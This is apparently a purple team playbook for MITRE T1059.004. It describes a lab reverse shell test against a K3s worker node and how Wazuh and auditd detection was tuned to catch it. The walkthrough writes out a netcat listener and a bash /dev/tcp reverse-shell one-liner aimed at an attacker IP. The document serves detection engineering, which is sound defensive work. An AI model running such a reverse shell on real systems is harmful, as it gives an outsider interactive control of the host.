# Purple Team Playbook: T1059.004 - Reverse Shell Execution

## Executive Summary
* **Tactic:** Execution (TA0002)
* **Technique:** Command and Scripting Interpreter (T1059)
* **Sub-technique:** Unix Shell (T1059.004)
* **Target System:** `node01` (K3s Cluster Worker Node / Wazuh Agent `002`)
* **Target IP:** `192.168.178.25`
* **Attacker Platform:** Kali Linux VM (Hyper-V External Virtual Switch)
* **Attacker IP:** `192.168.178.29`
* **Status:** Successfully Executed, Detected, and Triaged via Custom Rule Tuning

## Technical Context & Detection Engineering Lifecycle
Initial testing revealed that default Wazuh log-monitoring rules fail to capture standard interactive `/dev/tcp` background memory shells. To remediate this critical visibility blindspot, an automated Ansible deployment strategy was developed to provision the Linux Audit Daemon (`auditd`) across all cluster hosts, streaming system calls (`execve`) natively to the SIEM. 

To eliminate background false positives generated continuously by K3s orchestration engines (e.g., Flannel networking loops and cAdvisor system tools), the final detection logic filters explicitly for interactive pseudo-terminal allocations (`tty: ptsX`), successfully mitigating alert fatigue.

## Simulation Walkthrough

### 1. Attacker Setup (Listener Configuration)
The operator configures an active background utility listener on the adversarial machine to capture inbound terminal streams.

```bash
# Bind listener to listen for incoming network sockets safely
# -l: Listen for incoming connections
# -v: Verbose console tracking logs
# -n: Suppress native DNS name resolution
# -p: Target transport layer port 4444
nc -lvnp 4444
```

### 2. Exploitation (Interactive Shell Callback Execution)
The operator targets the execution console on the worker infrastructure. They run a direct shell forwarding loop that redirects the local standard input/output streams straight into a raw external network socket.

```bash
# Invoke shell redirect targeting the external listener infrastructure
# bash -c: Pass the target string directly to the interpreter execution engine
bash -c 'bash -i >& /dev/tcp/192.168.178.29/4444 0>&1'
```

## Strategic Mitigation & Remediation Tuning
1. **Network Egress Safeguards:** Configure strict outbound network boundary policies using upstream firewall infrastructure to deny worker nodes the capability to call out to raw external subnets on arbitrary execution ports.
2. **Alert Rule Inversion:** The deployment relies on regex-based negation filters targeting `audit.tty` fields to intentionally discard headless system orchestration traffic, keeping analysts completely free from benign alert noise.
